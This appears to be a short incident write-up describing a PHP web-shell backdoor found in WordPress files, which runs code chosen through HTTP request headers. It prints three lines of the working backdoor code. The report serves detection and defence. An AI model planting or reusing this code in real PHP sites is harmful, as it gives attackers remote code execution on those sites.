# [FSCWM-WP-1] Backdoor with Header If-Unmodified-Since/Content-Security-Policy/Server-Timing

## Information
|   |   |
|---|---|
| Trophy Code | FSCWM-WP-1 |
| Date | 24Jan2023 |
| Categories | Wordpress, Backdoor, WebShell |
| Tags | #WordPress #Backdoor #webshell |


## Background
This backdoor was found during regular check up. Suspicious was raised seeing a short written PHP code inside some random PHP files in WordPress. wp-cli command raised error during execution.

This backdoor appears to utilise the incoming request header to execute the malicious payload. Please notice that the header name varies every time in different files, you should not search the backdoor just based on the header names showing in this report. It has multiple parts splited in files, and this cause wp-cli error because the command does not load up every PHP files normally loaded up with WordPress core.

## Trophies

```
$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$mb_convert=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Server-Timing']));$mb_convert();}
$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$rindex=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Large-Allocation']($_HEADERS['Authorization']));$rindex();}
$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$mb_convert=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Server-Timing']));$mb_convert();}
```
